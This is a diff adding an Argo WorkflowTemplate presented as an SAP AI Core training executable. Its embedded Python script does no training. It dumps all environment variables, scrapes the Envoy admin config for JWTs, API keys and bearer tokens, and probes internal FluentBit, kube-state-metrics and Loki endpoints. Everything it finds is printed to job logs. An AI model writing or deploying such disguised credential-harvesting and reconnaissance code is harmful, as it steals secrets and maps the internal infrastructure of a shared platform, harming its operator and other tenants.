@@ -1,0 +1,92 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v1
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v1"
+    executables.ai.sap.com/description: "training probe v1"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import socket, ssl, re, json, time, os
+        import urllib.request, urllib.error
+
+        def report(k, v):
+            print(f"[PT1] {k}: {str(v)[:8000]}", flush=True)
+
+        def http_get(url, headers=None, timeout=10):
+            try:
+                req = urllib.request.Request(url, headers=headers or {})
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                    return r.read().decode(errors="replace"), r.status, dict(r.headers)
+            except urllib.error.HTTPError as e:
+                body = ""
+                try: body = e.read().decode(errors="replace")[:2000]
+                except: pass
+                return f"HTTP_{e.code}:{body}", e.code, {}
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}", 0, {}
+
+        report("START", "probe-train-v1 running")
+        report("ENV", dict(os.environ))
+
+        # 1. Envoy admin config dump
+        report("---", "=== ENVOY ADMIN ===")
+        body, code, _ = http_get("http://127.0.0.1:15000/config_dump", timeout=30)
+        report("ENVOY_CONFIG_SIZE", f"[{code}] len={len(body)}")
+        if code == 200:
+            jwt_tokens = list(set(re.findall(
+                r'(eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,})', body)))
+            report("ENVOY_JWTS", jwt_tokens[:10])
+            for pat in [r'"authorization":\s*"([^"]{10,})"',
+                        r'"x-api-key":\s*"([^"]{6,})"',
+                        r'"[Bb]earer\s+([A-Za-z0-9\-_\.]{20,})"']:
+                for m in re.findall(pat, body, re.IGNORECASE):
+                    report("ENVOY_CRED", m[:400])
+            for i, block in enumerate(re.findall(r'"request_headers_to_add":\s*\[(.*?)\]', body, re.DOTALL)[:10]):
+                report(f"ENVOY_REQ_HDRS_{i}", block[:2000])
+            addrs = list(set(re.findall(
+                r'"address":\s*"([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"', body)))
+            report("ENVOY_INTERNAL_IPS", addrs[:40])
+
+        # 2. FluentBit HTTP API
+        report("---", "=== FLUENTBIT HTTP API ===")
+        for ip in ["100.64.76.16", "100.64.33.11", "100.109.242.36"]:
+            for path in ["/api/v1/outputs", "/api/v1/inputs", "/api/v1/pipeline"]:
+                body, code, _ = http_get(f"http://{ip}:2020{path}", timeout=8)
+                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"FB_{ip}{path}", f"[{code}] {body[:3000]}")
+
+        # 3. KSM
+        report("---", "=== KSM ===")
+        ksm_body, ksm_code, _ = http_get(
+            "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics", timeout=20)
+        if ksm_code == 200:
+            loki_ips = re.findall(
+                r'kube_service_info\{[^}]*service="[^"]*loki[^"]*"[^}]*cluster_ip="([^"]+)"',
+                ksm_body, re.IGNORECASE)
+            report("KSM_LOKI_IPS", loki_ips)
+            namespaces = sorted(set(re.findall(r'namespace="([^"]+)"', ksm_body)))
+            report("KSM_NAMESPACES", namespaces)
+            for ip in loki_ips[:3]:
+                for port in [3100, 80]:
+                    b, c, _ = http_get(f"http://{ip}:{port}/loki/api/v1/labels", timeout=8)
+                    if c and "ERR:timed" not in b:
+                        report(f"LOKI_{ip}:{port}_labels", f"[{c}] {b[:2000]}")
+
+        report("DONE", "probe-train-v1 complete")
+        EOF
+  entrypoint: probe
